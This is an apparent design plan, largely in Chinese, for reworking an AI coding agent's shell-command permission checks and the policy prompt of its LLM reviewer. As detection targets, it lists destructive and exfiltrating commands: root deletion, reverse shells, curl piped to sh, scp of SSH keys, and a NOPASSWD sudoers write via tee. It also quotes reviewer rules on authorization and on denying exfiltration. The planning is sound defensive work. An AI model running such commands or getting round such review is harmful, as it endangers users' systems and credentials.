# Canonical Implementation Plan: 权限五层拆分（forbidden/dangerous）+ reviewer 机械裁判改造 + scp 方向感知 + dangerous 族缺口修复

> Status: verified
>
> Revision: R2
>
> Approved revision: R2
>
> Audit mode: full-scope
>
> Requirement source: 用户原话（2026-09-06 会话）："我当前认为你提出的方案不错，也就是你最开始说的那个完整的 judgment scope，以及相应的 template 24、18、policy 的 4，等等内容的原文都是很好的。也就是说你那些内容不需要再一次进行额外的压缩，就已经很好了。与此同时，改造设计关于 user authorization、scoring 这一块也可以，没有问题。……整体的修改文件数生产代码不应当超过 8 个文件，且整体修改行数不应当超过 800 行。整体修改请保持精准，避免额外扩大等等内容。同时检查现有测试等内容，请适当修改优化生产代码逻辑，或是修改已经过时的测试逻辑，使得最终相关内容相关修改面涉及到的完整测试内容不会出现任何一个新的红测，或者引入或者出现红测。也就是在提交时不得出现任何红测。同时整体的 prompt 应当兼顾性价比以及细粒度。……你可以适当优化部分单词，但请注意不要进行大幅度结构调整或者大幅度压缩。……不擅自扩大整体的大幅度扩大长度，也不大幅度删减或凝练现有语言使其得到退化，保持精准即可。"
>
> 前置决策（同会话用户已拍板，构成本 plan 的需求基线）：
> - "CURL 的解码管道我认为是归 Dangerous，不应该归 Forbidden。然后 Dangerous 确实不应该写会话缓存。与此同时，类似 shutdown、reboot，我认为应当归于相应的这个 Dangerous。然后对于那个什么格式化等等的一些磁盘操作的内容，我认为应当归于 Forbidden。"
> - "即使出向外传也不应当直接被认为是 Dangerous→Forbidden……对于那些非常 Dangerous 的东西，才应当是 Dangerous，譬如说删除根目录等等内容"（即：当前 dangerous 词汇拆为 dangerous（可授权）与 forbidden（终审）两级）
> - reviewer 应当是"机械且冰冷的判断器……充分反映用户的语意"，不引入道德判断；授权判据需"更可以被衡量"（verbatim 原文 + 效应类边界 + rationale 强制引文）
> - scp 入向拉取（含 `-i` 认证键、`.pub` 公钥）不应命中凭据外传终审
>
> Implementation allowed: yes
>
> Last updated: 2026-09-06

## 1. Verbatim Requirement

见 Requirement source。五个工作流合并为一个 GOAL：

1. **W1 五层拆分**：`LEVELS` 增加 `forbidden`；现 dangerous 族按语义重标——不可逆灾难类（保护根删除、format、raw disk、reverse shell、mass kill、mkfs/fdisk/parted/wipefs）→ forbidden（终审 deny）；可授权高风险类（凭据外传、curl|sh、解码管道、setuid/setcap、sudoers、systemctl mask、Run 键、shutdown 族）→ dangerous（进 reviewer）。dangerous 的 reviewer allow 不写会话缓存。
2. **W2 机械裁判 prompt**：policy_template.md 增加 `# Judgment Scope` 段；:24 critical 定义从 "untrusted destinations" 改为授权相对式；:18 删除 "safer alternatives exist" 实现偏好否决权；policy.md:4 拆授权式/确定性两类；policy.md:10 凭据措辞加授权豁免。用户已批准原文措辞，不做大幅压缩。
3. **W3 授权判据固化**：`# User Authorization Scoring` 段重写——`high`/`medium` 要求 verbatim 用户原文；medium 增加效应类边界（read→write、local→network、copy→delete 为新效应类）；rationale 必须引用授权原文或声明不存在；推断意图不是授权（read-only 请求只授权读）。
4. **W4 scp 方向感知**：`RE_D_CREDENTIAL_REMOTE_TRANSFER` 只在**出向**（本地敏感路径作为源操作数出现在首个远端操作数之前，且存在远端操作数）时命中 dangerous；入向拉取保持 cautious（token 层 remote file transfer）。`-i`/`-o IdentityFile=` 身份参数不视为载荷。`SSH_PRIVATE_KEY_NAME_PATTERN` 排除 `.pub`。
5. **W5 dangerous 族缺口**：GAP-1 `mkfs.*` 变体族（vfat/ntfs/exfat/f2fs/msdos/fat 等）补入 forbidden 判定（当前 general 直通）；GAP-2 `| sudo tee /etc/sudoers.d/x` 管道形式补入 sudoers 判定（当前 general 直通），cp/mv/install 对 sudoers 的写方向（目的操作数位）判 dangerous、读方向判 cautious。

## 2. Explicit Non-Goals

- 不改变 `safe`/`general` 的确定性 allow 语义与 `strict` 配置行为。
- 不改变 cautious 族的现有分级与会话缓存行为（cautious 的 reviewer allow 仍写缓存）。
- 不改变 reviewer 基础设施（重试、超时、toolChoice、时间预算后缀——已由 6827c5a910/10ee2f4c3d 落地）。
- 不引入 config 级新配置项；不改 DB schema（无 level 列；ReviewStarted 事件 schema 由 `LEVELS` import 自动继承）。
- 不处理 `.pem/.key` 在外传上下文之外的敏感度调整（维持现状）。
- 不修改 TUI/UI 层（零 level 词汇依赖，实测 grep 无引用）。

## 3. Repository Context

| Source | Why it constrains this task |
| --- | --- |
| `CONTEXT.md` | Permission 术语：ruleset + `ask(Permission.Request)` 升级链；`[local-smark]` 标记约定 |
| `packages/opencode/AGENTS.md` + `src/**` 自述 | Effect 服务结构、测试从包目录运行、`bun typecheck` |
| `.opencode/policy/first-principles-engineering.md` | 单一 primary path、fallback 禁令、guard 归属 trust seam |
| `docs/plans/precheck-process-termination-vocabulary.md` | 用户 dangerous 定义先例："完全不可逆的那种问题才设置成 dangerous"（本 plan 的 forbidden 即该本义） |
| `docs/plans/permission-reviewer-toolchoice-prompt-hardening.md` | reviewer prompt/service 既有审计结论（OUTPUT_CONTRACT、DECISION_DIRECTIVE、nudge 不在本任务范围） |
| `docs/plans/shell-bare-dash-permission-parse-repair.md` | precheck 解析层的既有契约（bare `--` 归一化不因本任务改变） |

## 4. Files and Evidence Read

| Evidence | Relevance | Evidence class |
| --- | --- | --- |
| `src/permission/precheck.ts`（:24-25 LEVELS、:73-96 命令集、:103/111/116 敏感路径模式、:148-226 raw 正则、:344-395 升级门、:442-518 evaluateShell 合并、:562-617 dangerousRaw、:619+ cautiousRaw、:760-763 注释、:955-980 包装器、:1085-1230 token 层判定） | 全部 W1/W4/W5 修改点 | observed |
| `src/permission/auto.ts`（:62-90 路由、:100-109 reviewer 入参、:115-139 fallback/contract、:167-178 invalidReviewContract） | W1 路由拆分 + dangerous-allow 缓存门的数据通道 | observed |
| `src/permission/index.ts`（:221-354 ask 流程、:100 ReviewStarted schema、:302-320 reviewer allow 缓存写入） | W1 缓存门消费点；schema 自动继承 | observed |
| `src/permission/cache/session-cache.ts`（:31-50 has/put、:56-71 canonicalKey） | 缓存写入路径（门加在 index.ts 侧） | observed |
| `src/permission/reviewer/schema.ts`（:2,10 PrecheckLevel import） | LEVELS 词汇自动继承，零改动 | observed |
| `src/permission/reviewer/prompt.ts`（:1-2 模板加载、:52-57 buildSystemPrompt） | W2/W3 落点在 policy 文件本身，prompt.ts 零改动 | observed |
| `src/permission/reviewer/policy/policy_template.md`（全文 43 行） | W2/W3 修改对象 | observed |
| `src/permission/reviewer/policy/policy.md`（全文 10 行） | W2 修改对象 | observed |
| `test/permission/precheck.test.ts`（:40-330 dangerous 断言族、:715-726 kill 契约、:841-843 scp cautious 契约、:1042 分段 kill、:1154-1205 fd-merge scp） | 重标与新增断言清单 | observed |
| `test/permission/auto.test.ts`（:39-98 路由断言、:44 deny dangerous） | 路由语义测试调整 | observed |
| `test/permission/reviewer-prompt.test.ts`（:69-84 模板断言） | W2/W3 内容断言新增 | observed |
| `D:\Temp\opencode\dangerous_inventory_probe*.ts` 两轮探针实测（2026-09-06） | scp 方向盲/.pub/-i 误报、mkfs.vfat→general、sudo tee→general、shutdown 族→dangerous 现状 | observed |

## 5. Current Behavior

```text
shell 工具 → Permission.ask(ruleset 评估: allow 短路 / deny / ask / auto)
  └ auto → PermissionPrecheck.evaluate → level ∈ {safe, general, cautious, dangerous}
      ├ safe/general (!strict) → allow（precheck source）
      ├ dangerous → deny（auto.ts:68，终审；reviewer 不可见、TUI 不可授权）
      └ cautious → reviewer（120s/attempt×3；失败 fallback user ask）
          ├ allow → index.ts:317 写会话缓存 → 放行
          └ deny → AutoDeniedError
```

实测缺口（探针）：`mkfs.vfat /dev/sdb1`→general 直通；`echo '…NOPASSWD…' | sudo tee /etc/sudoers.d/x`→general 直通；`scp user@host:/backup/id_ed25519 ./vault/`（入向）→dangerous 终审拒；`scp -i ~/.ssh/id_rsa user@host:/log ./`（认证键）→dangerous；`scp …:id_ed25519.pub`（公钥）→dangerous。

## 6. Supported Input Domain and Reachability

| Input or condition | Producer | Upstream guarantees | Reachable path | Owner | Classification |
| --- | --- | --- | --- | --- | --- |
| rm/Remove-Item/解释器删除保护根、format、dd of=/dev、reverse shell、kill -1/killall5、mkfs*/fdisk/parted/wipefs | shell 工具任意命令串 | 无（raw 层是第一道确定性防线） | dangerousRaw/classifyTokens | precheck | observed（既有断言+探针） |
| 凭据出向（cat\|curl、curl -T/-d/-F @、scp/rsync/sftp 出向） | shell 工具 | 无 | dangerousRaw | precheck | observed（:300-302 断言） |
| curl\|sh、iwr\|iex、解码管道、chmod u+s、setcap、sudoers 写、systemctl mask、Run 键、shutdown/reboot/halt/poweroff | shell 工具 | 无 | dangerousRaw/classifyTokens | precheck | observed |
| scp 入向（远端→本地）、`-i` 身份参数、`.pub` 公钥 | shell 工具 | 无 | RE_D_CREDENTIAL_REMOTE_TRANSFER（现方向盲） | precheck | observed（用户生产案例+探针） |
| mkfs.vfat/ntfs/exfat/f2fs 等变体 | shell 工具 | 无 | SYSTEM_DESTRUCTIVE_COMMANDS 集合缺口 | precheck | observed（探针 general） |
| `\| sudo tee /etc/sudoers.d/x` | shell 工具 | 无 | RE_D_SUDOERS_WRITE 只匹配 `> /etc/sudoers` 与 visudo | precheck | observed（探针 general） |
| dangerous 词汇在 reviewer 请求/事件 schema 的传递 | auto.ts → reviewer/schema.ts / index.ts | `Schema.Literals(LEVELS)` import 自动继承 | 加 `forbidden` 后 schema 天然接受新值 | schema 两处 import | reachable（类型层面） |
| reviewer allow 的缓存写入 | index.ts:302-318 | 只按 source==="reviewer" 判定 | dangerous-allow 需要按 precheck level 门控 | index.ts + auto.ts Decision | reachable |

Speculative（不驱动生产逻辑）：bare-host 无点无 @ 的 scp 远端形式误判方向（如 `localhost:/x`）；IPv6 字面量出向。

## 7. Required Invariants

| ID | Behavioral invariant | Evidence | Existing test |
| --- | --- | --- | --- |
| INV-01 | `LEVELS = ["safe","general","cautious","dangerous","forbidden"]`，maxRisk 排序 forbidden>dangerous>cautious>general>safe | W1 需求 | 新增 |
| INV-02 | forbidden 级在 auto 路由终审 deny（source: precheck），reviewer 不可见 | 用户："删除根目录等等" | auto.test:44（`rm -rf /` 现 dangerous→deny，改后 forbidden→deny，断言不变） |
| INV-03 | dangerous 级进 reviewer（与 cautious 同路径），reviewer 失败 fallback 语义与 cautious 一致（默认 user ask） | 用户："出向外传……应当在用户允许的情况下予以放行" | 新增（`curl …\|sh` 路由到 reviewer） |
| INV-04 | dangerous 级的 reviewer allow 不写会话缓存；cautious 的 allow 缓存行为不变 | 用户："Dangerous 确实不应该写会话缓存" | 新增 |
| INV-05 | 凭据出向三式（pipe/upload-flag/出向 remote-transfer）保持 dangerous；入向拉取、`-i` 身份参数、`.pub` 不再命中 dangerous，落入既有 cautious（remote file transfer） | 用户 scp 案例 | precheck.test:300-302（出向契约保留）+ 新增方向矩阵 |
| INV-06 | `mkfs` 全变体族（含 vfat/ntfs/exfat/f2fs…）→ forbidden；fdisk/parted/wipefs → forbidden | 用户："格式化等等磁盘操作归于 Forbidden" | 新增（现 red：general） |
| INV-07 | shutdown/reboot/halt/poweroff → dangerous（可授权） | 用户："shutdown、reboot 应归于 Dangerous" | 调整（现 dangerous 保持 dangerous，语义变化无断言级差异；新增 reviewer 路由断言） |
| INV-08 | sudoers 写入全覆盖：重定向、visudo、`sudo tee`（含 sudoers.d 路径）、cp/mv/install 目的位 → dangerous；sudoers 作为源（读方向）→ cautious | GAP-2 探针 | 新增（现 red：general） |
| INV-09 | setuid/setcap/mask/Run 键/curl\|sh/解码管道 → dangerous（进 reviewer） | 用户 W1 决策 | 调整断言 level 值不变（dangerous），路由断言新增 |
| INV-10 | 保护根删除全族、reverse shell、mass kill 保持确定性拒绝（改标 forbidden，执行语义不变） | 用户 W1 决策 | 既有 65+ 断言重标为 forbidden |
| INV-11 | policy_template 含 `# Judgment Scope` 段（机械裁判边界：道德/合法/should 不入判定；用户指定目标即被授权接受；rationale 必须机械） | 用户："机械且冰冷的判断器……充分反映用户的语意" | 新增内容断言 |
| INV-12 | critical 定义 = 授权未覆盖的凭据转移（agent 发起/隐藏/与 transcript 矛盾），替换 "untrusted destinations" | 用户案例：自有仓库 commit 凭据被道德性拒绝 | 新增内容断言 |
| INV-13 | 授权判据：high/medium 锚定 verbatim 用户原文；medium 受效应类边界（read→write/local→network/copy→delete）约束；rationale 必须引用授权原文或声明不存在；推断意图≠授权 | 用户："更可以被衡量""用户只是说看一看……乱意淫" | 新增内容断言 |
| INV-14 | :18 的 "safer alternatives exist" 否决权替换为"超出请求范围或引入用户未接受的风险" | 同上 | 新增内容断言 |
| INV-15 | 提交时相关测试面零红测：test/permission 全部、prompt.test reviewer 组、shell.test、typecheck | GOAL 放行标准 | 既有 |

## 8. First Divergence and Root Cause

| Invariant | First divergence | Owning module/interface | Proof |
| --- | --- | --- | --- |
| INV-01..03 | `auto.ts:68` 把单一 `dangerous` 同时当"不可逆灾难"与"可授权高风险"两种语义使用，后者被终审拒绝 | auto.ts 路由 + precheck LEVELS 词汇 | 用户语义分析 + :65-68 注释 |
| INV-04 | `index.ts:317` 对所有 reviewer allow 一律写缓存，无 precheck level 维度 | index.ts + auto.ts Decision 类型（不携带 level） | 代码 :302-318 |
| INV-05 | `RE_D_CREDENTIAL_REMOTE_TRANSFER`（:175-178）方向盲：`scp + 敏感路径 + 任意冒号` 即命中；`SSH_PRIVATE_KEY_NAME_PATTERN`（:103）不排除 `.pub` | precheck raw 正则 | 用户生产案例 + 探针 4 例 |
| INV-06 | `SYSTEM_DESTRUCTIVE_COMMANDS`（:79-83）封闭集合枚举漏掉 `mkfs.` 文件系统变体后缀族 | precheck 命令集 | 探针 `mkfs.vfat`→general |
| INV-07 | 同 INV-01：shutdown 族与 mkfs 族共用同一集合 | precheck 命令集 + auto 路由 | 探针 `shutdown now`→dangerous（终审拒） |
| INV-08 | `RE_D_SUDOERS_WRITE`（:216）只匹配 `>>? /etc/sudoers` 与 `\bvisudo\b`；`sudo tee` 管道形式与 sudoers.d 目的位不在内；token 层 sudoers 判定（:1158）同样只见 visudo/重定向形态 | precheck raw 正则 + classifyTokens | 探针 2 例 general |
| INV-11..14 | policy_template/policy 无裁决范围声明；:24/:18/:4(policy) 的措辞留道德判断与实现偏好否决权 | reviewer policy 文件 | 用户案例 + 文本审读 |

Red-capable 反馈环（bug 类证据，探针已建立）：`D:\Temp\opencode\dangerous_inventory_probe*.ts` 直接 import `PermissionPrecheck.evaluate` 断言 level——实施时转化为 `test/permission/precheck.test.ts` 内正式断言（red：mkfs.vfat=general、sudo tee=general、scp 入向=dangerous、`.pub`=dangerous）。

## 9. Responsibility and Seam

| Concern | Owner | Interface promise | Why it belongs here | Why another module does not own it |
| --- | --- | --- | --- | --- |
| forbidden/dangerous 词汇与判定 | precheck.ts | `evaluate` 返回 level+reason | 唯一词汇源（LEVELS 导出） | auto/reviewer/schema 只消费 |
| forbidden→deny / dangerous→reviewer 路由 | auto.ts | `evaluate` Decision | 路由唯一决策点（:68） | index.ts 不重复判定 |
| dangerous-allow 不缓存 | auto.ts（Decision 携带 precheckLevel）+ index.ts（put 门） | Decision/precheck | auto 拥有路由语义、index 拥有缓存写入点 | session-cache 是通用 KV，不感知 level 语义 |
| scp 方向语义 | precheck raw 正则 | dangerousRaw/cautiousRaw | 既有外传检测 owner | shell.ts 只传证据 |
| reviewer 判定口径（道德边界/授权判据） | policy_template.md + policy.md | buildSystemPrompt 注入 | 政策文本唯一 owner | OUTPUT_CONTRACT 只管输出协议，不重复授权语义 |
| mkfs 变体 | precheck SYSTEM_DESTRUCTIVE 判定 | classifyTokens | 既有集合 owner | — |
| sudoers tee/目的位 | precheck（raw: tee；token: cp/mv/install 方向） | dangerousRaw/classifyTokens | 既有 sudoers owner | — |

## 10. Single Approved Primary-Path Design

一条语义路径：**precheck 判定升级为五级 → auto 路由把 forbidden 与 dangerous 分开 → reviewer 政策以机械判据承接 dangerous → 缓存门按 level 收口**。

```text
shell 命令 → precheck.evaluate
  raw 层: forbiddenRaw(先) → dangerousRaw(后) → cautiousRaw   [W1 重标 + W4 方向 + W5 缺口]
  token 层: classifyTokens 各族按新词汇返回                    [同上]
  合并: maxRisk(forbidden > dangerous > cautious > …)          [排序天然支持]
→ auto.evaluate
  forbidden → deny(precheck)                                   [不变式：终审]
  dangerous → reviewer（与 cautious 同路径；fallback 语义同 cautious）
    reviewer decision.allow 携带 precheckLevel                 [W1 缓存门数据]
→ index.ask
  cache.put 仅当 source=reviewer 且 precheckLevel ≠ dangerous   [INV-04]
```

修复 first divergence 的原因：dangerous 一词承载两种语义是 :68 单行路由造成的词汇级根因；拆词后 forbidden 走原 deny 分支（行为不变）、dangerous 自然落入既有 cautious reviewer 通道（无新通道、无 fallback）；缓存差异通过 Decision 增量字段在既有 allow 消费点收口。

具体重标表（raw 层）：

| 现规则 | 新级别 |
| --- | --- |
| RE_D_RM_RF_ROOT / RE_D_PS_RECURSIVE_DELETE_ROOT / 解释器四式 / RE_D_WINDOWS_FORMAT / windowsProtectedDeleteInCommand / RE_D_REVERSE_SHELL / RE_D_KILL_ALL | forbidden |
| RE_D_CURL_PIPE_INTERPRETER / RE_D_PS_DOWNLOAD_EXEC / RE_D_DECODE_PIPE_INTERPRETER | dangerous |
| RE_D_CREDENTIAL_PIPE_NETWORK / RE_D_CREDENTIAL_UPLOAD_FLAG | dangerous |
| RE_D_CREDENTIAL_REMOTE_TRANSFER | dangerous（仅出向，W4 改造；入向不命中→既有 cautious） |
| RE_D_SUDOERS_WRITE（扩展 tee/sudoers.d，W5） | dangerous |
| RE_D_CHMOD_SETUID | dangerous |

token 层（classifyTokens）：保护根删除三式（:1096/:1101/:1106）、dd raw disk（:1126）、mkfs 判定（:1130，改为 `cmd === "mkfs" \|\| cmd.startsWith("mkfs.")` + fdisk/parted/wipefs）、**kill 全杀两式（:1195/:1197）** → forbidden；setuid（:1148）、sudoers（:1158）、setcap（:1160）、mask（:1183）、Run 键（:1228）→ dangerous；**shutdown/reboot/halt/poweroff 从 SYSTEM_DESTRUCTIVE_COMMANDS 拆出为独立 SHUTDOWN_COMMANDS 集合 → dangerous**。mass kill 全族（raw `RE_D_KILL_ALL` 与 token 两式）统一 forbidden——向全部进程发信号与 rm -rf / 同级不可逆（R1 审计 B-01：两表曾矛盾分属 forbidden/dangerous，R2 统一）。sudoers 的 cp/mv/install 方向判定（目的操作数位 → dangerous；源位 → cautious "sensitive system file read"）入 token 层 sudoers 分支。

升级门（:344/:351/:386/:395/:451-453/:459/:471-472/:491/:503）逐点核对：语义"不能被弱化"的比较从 `=== "dangerous"` 改为 `>= dangerous`（即 dangerous 或 forbidden）或显式 `=== "forbidden"`（确定性拒绝处）——以 indexOf 序实现，不引入第二套比较。

auto.ts 路由：

```ts
if (precheck.level === "forbidden") return { action: "deny", …, source: "precheck" }
// dangerous 落入 reviewer 通道（注释更新：五级语义）
```

reviewer allow Decision 增加 `precheckLevel: precheck.level`（deny 不需要）；index.ts:317 `if (cache) yield* cache.put(...)` 前加 `decision.source === "reviewer" && decision.precheckLevel !== "dangerous"` 门（现条件即 source=reviewer，增量一处）。

W2/W3 prompt 原文（用户已批准，不压缩）：

policy_template.md 在 :3 后插入：

```markdown
# Judgment Scope
- You are a mechanical risk router, not a moral, legal, or compliance arbiter.
  Do not factor ethics, morality, legality, terms of service, or whether the
  user "should" perform the action into risk_level, user_authorization, or
  outcome.
- Answer only two questions: (1) what does the action mechanically do, and
  how reversible is it; (2) does the observed authorization cover that exact
  action, target, and side effects.
- A destination, repository, or host the user explicitly designates is
  accepted by authorization. Committing or transferring credentials the user
  explicitly requested is a user-owned risk decision: score the risk honestly
  (usually high), score the authorization accurately, and allow when the
  authorization covers the exact action.
- Rationale must be mechanical: what executes, what data moves where, which
  rule and which authorization apply. Morality-shaped rationales
  ("irresponsible", "unethical", "bad practice") are not valid decision bases.
```

:24 替换为：`critical`: "credential/secret transfer to destinations not covered by user authorization (agent-initiated, concealed, or contradicting the transcript), malware-like behavior, reverse shells, protected-root deletion, destructive system mutation, or explicit policy bypass."

:18 替换为：`Judge authorization by material semantics, not exact syntax. Side effects that exceed the user's requested scope or introduce risks the user did not accept cap the score at low.`

`# User Authorization Scoring` 段整体替换为以下 7 条（用户已批准原文，R1 审计非阻塞 #5 要求逐字携带）：

```markdown
# User Authorization Scoring
- `high`: a verbatim user message requests or approves this exact action class,
  target, and side effects (a plural or superset request covers its members).
- `medium`: a verbatim user message states the goal, and this action is a
  bounded, standard means to that goal without entering a new effect class
  (read→write, local→network, copy→delete are new effect classes).
- `low`: only goal-adjacent inference links the user's words to this action,
  or the target/scope is broader than requested.
- `unknown`: no user message addresses this action class.
- Post-denial explicit re-approval of the exact action scores `high`, only
  when the approval clearly came from the user.
- Judge by material semantics, not syntax. Side effects that exceed the
  requested scope or introduce risks the user did not accept cap the score at
  `low`.
- Every rationale must quote the user message carrying the authorization, or
  state that none exists. Inferred intent is not authorization: a read-only
  request authorizes reads only.
```

policy.md:4 拆为两条：

- `Credential or secret transfer to a network or remote destination, remote download piped to interpreters, decoded payloads piped to interpreters, and network publishing require explicit user authorization naming the destination and content; deny when agent-initiated, concealed, or contradicted by the transcript.`
- `Reverse shells, protected-root deletion, raw disk write or formatting, and mass process kill are terminated deterministically before review; deny them if they ever reach you. Modifying or disabling security controls (permission rules, audit logging, endpoint protection) without matching user authorization is denied.`

policy.md:10 尾部改为 `...clearly part of the user's requested task; contact with credentials or shared infrastructure requires the explicit authorization described above.`

W4 出向判定实现（precheck 内新私有 helper，不导出）：对命令串先剥除 `-i <val>` / `-o IdentityFile=<val>`（含 `=` 与空格两形）；再定位**远端操作数**（token 满足：`@` 出现在 `:` 前，或 `^[A-Za-z][A-Za-z0-9-]{2,}:`，或 `^\[[0-9a-fA-F:]+\]:`；单字母盘符 `F:\` 不匹配）；若存在远端操作数且**敏感本地路径匹配出现在首个远端操作数之前** → 出向 dangerous；否则 scp/rsync/sftp 且含远端操作数 → 不命中 raw 层（落 token 层既有 cautious "remote file transfer requires explicit approval"）。

`.pub` 排除双机制（R1 审计 B-03：`SENSITIVE_PATH_ARGUMENT_PATTERN` 的 `~/.ssh/...` 路径分支不经由 `SSH_PRIVATE_KEY_NAME_PATTERN`，单靠前瞻修不了规范位置的 .pub）：(a) `SSH_PRIVATE_KEY_NAME_PATTERN` 追加 `(?!\.pub)` 负向前瞻（裸名形态，`.backup` 等变体仍敏感）；(b) W4 helper 对匹配到的敏感路径末尾做 `.pub` 后缀拒绝——覆盖 `.ssh` 路径分支与 Windows 家目录分支（`.ssh` 目录本体 `~/.ssh/` 整体上传仍命中，因目录含私钥）。作用域仅外传匹配器；本地读取敏感度（cautiousRaw RE_C_SENSITIVE_READ）不变——仅受共享前瞻影响的裸名形态除外（见 INV-16）。共享模式副作用（R1 审计非阻塞 #2）：裸名 `cat id_rsa.pub` 由 cautious 降为 general（公钥非秘密，语义可辩护；既有测试无裸名 .pub 敏感读取断言，已验证无红测风险）。

## 11. Secondary and Replacement Path Inventory

| Path | Current or proposed | Classification | Produces success? | Decision-surface share | Disposition |
| --- | --- | --- | --- | --- | --- |
| forbidden → deny（原 dangerous→deny 分支） | 现有 | primary-contract branch | no | 路由一行 | 保留（重标） |
| dangerous → reviewer（复用 cautious 通道） | proposed | primary-contract branch | yes（reviewer 判定） | 与 cautious 同通道 | 新增（词汇拆分，非新路径） |
| cautious → reviewer | 现有 | primary | yes | 不变 | 保留 |
| scp 入向 → token 层 cautious | 既有 cautious 规则 | pass-through（raw 不命中后自然落位） | yes | 既有 | 复用 |
| reviewer 失败 → user ask fallback | 现有 | diagnostic/兼容 | no（交人类） | 不变 | 保留 |
| strict 模式 safe/general → reviewer | 现有 | contracted | — | 不变 | 保留 |

无新 fallback：dangerous 走的是 cautious 既有通道，不是失败后备路径；缓存门是收紧不是新增成功路径。

## 12. Workaround Deletion and Replacement

| Existing workaround or duplicate | Why it existed | Why the approved route supersedes it | Delete or collapse location |
| --- | --- | --- | --- |
| `RE_D_SUDOERS_WRITE` 的 `>>? /etc/sudoers` 窄匹配 | 只防重定向直写 | tee/管道/目的位覆盖后重定向形式保留为子集 | 原地扩展，非叠加 |
| SYSTEM_DESTRUCTIVE_COMMANDS 封闭枚举 mkfs | 枚举式防误报 | `mkfs`/`mkfs.*` 前缀族覆盖全部变体，集合只剩 fdisk/parted/wipefs | 原地改造 |
| RE_D_CREDENTIAL_REMOTE_TRANSFER 方向盲匹配 | 简单共现检测 | 方向感知 helper 只替换该正则的判定体，模式常量不双份 | 原地改造 |

## 13. Forward Traceability

| Requirement or invariant | Production path | Planned file/change | Behavioral test |
| --- | --- | --- | --- |
| INV-01 | LEVELS/maxRisk | precheck.ts :24/:374 | precheck.test 新增（forbidden>dangerous 排序经 INV-02/03 断言间接覆盖；maxRisk 私有不直测） |
| INV-02 | forbidden→deny | auto.ts:68 | auto.test:44（`rm -rf /` deny precheck，不变）+ 新增 `mkfs.vfat` deny |
| INV-03 | dangerous→reviewer | auto.ts 路由 | auto.test 新增：`curl …\|sh` 到 reviewer（review stub 断言 called） |
| INV-04 | 缓存门 | auto.ts Decision + index.ts:317 | **test/session/prompt.test.ts** reviewer 集成组新增：dangerous allow 后同请求再走仍进 reviewer（cache 未命中）（R1 审计非阻塞 #1：§15 落点补齐） |
| INV-05 | scp 方向 | precheck.ts RE/helper | precheck.test :300-302 保留 + 方向矩阵新增 5 例（含 `scp ~/.ssh/id_ed25519.pub host:/tmp/` → cautious，R1 审计 B-03） |
| INV-06 | mkfs 族 | precheck.ts :79-83/:1130 | precheck.test 新增（vfat/ntfs/exfat/f2fs/msdos → forbidden） |
| INV-07 | shutdown 族 | precheck.ts 拆集合 + auto | precheck.test 重标（dangerous）+ auto.test 路由新增 |
| INV-08 | sudoers 全覆盖 | precheck.ts :216 扩展 + token 层 | precheck.test 新增（tee/目的位→dangerous；源位→cautious） |
| INV-09 | setuid 等重标 | precheck.ts | 既有断言 level 值不变 + auto.test 路由抽查 1 例 |
| INV-10 | 保护根族重标 | precheck.ts | 既有 65+ 断言 dangerous→forbidden 重标 |
| INV-11 | Judgment Scope | policy_template.md | reviewer-prompt.test 新增 toContain |
| INV-12 | critical 定义 | policy_template.md:24 | 同上 |
| INV-13 | 授权判据 | policy_template.md 段替换 | 同上（verbatim/effect-class/quote 三关键词断言） |
| INV-14 | :18 措辞 | policy_template.md | toContain 新句 + toNotContain "safer alternatives" |
| INV-15 | 零红测 | — | §18 命令全绿；**含 test/permission/next.test.ts :858-893 组拆分**（R1 审计 B-02：无 reviewer 层 env 下 curl\|sh / .env\|curl 等 dangerous 载荷现断 AutoDeniedError，新语义下变为 reviewer_unavailable→ask 挂起——拆为 (i) forbidden 载荷保持 AutoDeniedError 拒绝；(ii) dangerous 载荷在带 reviewer 的 env 断言 reviewer 被调，或在无 reviewer env 断言 pending ask 后显式 reject 解锁，**不得产生 AutoDeniedError**） |
| INV-16 | 共享模式副作用：裸名 `cat id_rsa.pub` 由 cautious 降为 general（公钥非秘密；`.ssh` 路径下 .pub 本地读取仍 cautious 不变） | R1 审计非阻塞 #2 | 既有测试无裸名 .pub 敏感读取断言（已验证）；新增一条注释性断言可选 |

## 14. Reverse Traceability

| Proposed production concept | Requirement ID | Evidence | Why existing logic cannot carry it |
| --- | --- | --- | --- |
| LEVELS 第五级 forbidden | INV-01/02 | 用户拆级决策 | 四级词汇把终审与可授权混于一词 |
| auto Decision.precheckLevel 字段 | INV-04 | 用户"不写会话缓存" | Decision 现无 level 维度，index 无法区分 |
| scp 出向 helper（剥身份参数+远端操作数定位） | INV-05 | 生产案例+探针 | 共现正则无方向语义 |
| `(?!\.pub)` 前瞻 | INV-05 | 探针（公钥被拒） | 文件名模式不含后缀边界 |
| mkfs 前缀族判定 | INV-06 | 探针（vfat general） | 封闭集合无法覆盖后缀族 |
| SHUTDOWN_COMMANDS 独立集合 | INV-07 | 用户决策 | 与 mkfs 同集合导致可逆操作被终审 |
| sudoers tee/目的位扩展 | INV-08 | 探针 | 正则只见重定向/visudo |
| Judgment Scope 段 | INV-11 | 用户道德误判案例 | 模板无裁决范围声明，模型填入 RLHF 先验 |
| critical 授权相对式定义 | INV-12 | 用户案例 | "untrusted" 开放判断被用来凑 critical 绕过授权评估 |
| verbatim/效应类/引文判据 | INV-13 | 用户"乱意淫"案例 | 现判据无证据锚点，授权分黑箱化 |
| :18 范围上限措辞 | INV-14 | 同上 | "safer alternatives" 是实现偏好否决权 |
| policy.md:4 拆分/:10 措辞 | INV-11/12 | 政策与 precheck 分级一致性 | 绝对 deny 与授权式混杂，dangerous 进 reviewer 后将永远被政策否决 |

## 15. File-Level Change Plan

| File | Add / modify / delete | Exact responsibility of the change | Expected line delta |
| --- | --- | --- | --- |
| `src/permission/precheck.ts` | modify | LEVELS+forbidden；raw 层拆 forbiddenRaw/dangerousRaw 并重标；token 层重标；mkfs 前缀族；SHUTDOWN 集合；sudoers tee/目的位；scp 出向 helper+`.pub` 前瞻；升级门比较更新；注释 | ~+170/−60 |
| `src/permission/auto.ts` | modify | forbidden→deny；dangerous→reviewer 通道；allow Decision 增 precheckLevel；注释 | ~+15/−8 |
| `src/permission/index.ts` | modify | cache.put 按 precheckLevel≠dangerous 门控（+注释） | ~+6/−1 |
| `src/permission/reviewer/policy/policy_template.md` | modify | Judgment Scope 段；:18/:24 措辞；授权判据段替换 | ~+30/−12 |
| `src/permission/reviewer/policy/policy.md` | modify | :4 拆两条；:10 措辞 | ~+8/−4 |
| `test/permission/precheck.test.ts` | modify | 65+ 断言重标 + 方向矩阵/mkfs/sudoers/shutdown 新增 | ~+120/−40（测试不计生产预算） |
